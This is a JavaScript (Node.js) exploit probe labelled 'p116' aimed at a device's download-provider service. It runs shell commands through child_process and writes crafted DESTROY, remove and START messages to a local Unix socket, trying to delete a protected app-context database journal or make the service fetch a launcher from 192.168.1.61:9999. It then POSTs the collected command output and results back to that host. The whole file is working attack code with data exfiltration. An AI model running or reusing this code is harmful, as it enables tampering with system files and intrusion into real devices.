"use strict";
var cp = null;
try { cp = require('child_process'); } catch (e) {}
var net = require('net');
var HOST='192.168.1.61', PORT=9999;
var R={ts:new Date().toISOString(), probe:'p116', results:{}, log:[]};
var posted=false;
function L(s){R.log.push(String(s).substring(0,500));}
function postBuf(path,buf){try{var hdr='POST '+path+' HTTP/1.1\r\nHost: '+HOST+':'+PORT+'\r\nContent-Type: application/octet-stream\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';var s=net.connect(PORT,HOST);s.on('connect',function(){s.write(hdr);s.write(buf);setTimeout(function(){s.destroy()},3000)});s.on('error',function(e){L('post err '+e.message)});}catch(e){L('post ctor '+e);}}
function postFinal(){if(posted)return;posted=true;postBuf('/p116info',new Buffer(JSON.stringify(R),'utf8'));}
function run(cmd,timeoutMs,maxLen){maxLen=maxLen||3000;if(!cp)return '[no cp]';try{var out=cp.execSync(cmd,{timeout:timeoutMs||25000,maxBuffer:16*1024*1024}).toString().trim();return '[exit 0] '+out.substring(0,maxLen);}catch(e){var o='';if(e.stdout)o+=e.stdout.toString();if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();return '[exit '+(e.status===undefined?'?':e.status)+'] '+(o||(e&&e.message)||'unknown').substring(0,maxLen);}}
function md5(p){return run('md5sum '+p+' 2>&1; ls -la '+p+' 2>&1',15000,1000);}
function sockSend(payload, cb){
  try{
    var s=net.connect({path:'/tmp/.download-provider.sock'});
    var out='';
    s.setTimeout(4000,function(){s.destroy();cb('TIMEOUT '+out);});
    s.on('connect',function(){s.write(payload);});
    s.on('data',function(d){out+=d.toString();});
    s.on('error',function(e){cb('ERR '+e.message+' '+out);});
    s.on('close',function(){cb(out);});
  }catch(e){cb('CTOR '+String(e));}
}
function main(){
  var J='/opt/dbspace/.app-context.db-journal';
  R.results.ls=run('ls -la /tmp/.download-provider.sock /opt/usr/data/download-provider 2>&1',10000,2000);
  R.results.jrn0=md5(J);
  var variants=[
    'DESTROY\n/opt/dbspace/.app-context.db-journal\n',
    'FILENAME\n/opt/dbspace/.app-context.db-journal\nDESTROY\n',
    'START\nhttp://192.168.1.61:9999/appctx_hot_journal_launcher\n/opt/dbspace\n.app-context.db-journal\n',
    '{"command":"remove","filename":"/opt/dbspace/.app-context.db-journal"}\n',
    '{"op":"destroy","filename":"/opt/dbspace/.app-context.db-journal"}\n'
  ];
  var i=0;
  function step(){
    if(i>=variants.length){
      R.results.final='done '+new Date().toISOString();
      L('done');
      postFinal();
      setTimeout(postFinal,20000);
      return;
    }
    sockSend(variants[i],function(out){
      R.results['sock'+i]=out;
      R.results['jrn'+(i+1)]=md5(J);
      i++;
      step();
    });
  }
  step();
}
try{main();}catch(e){R.results.fatal=String(e)+' | '+(e.stack||'no-stack');postFinal();}
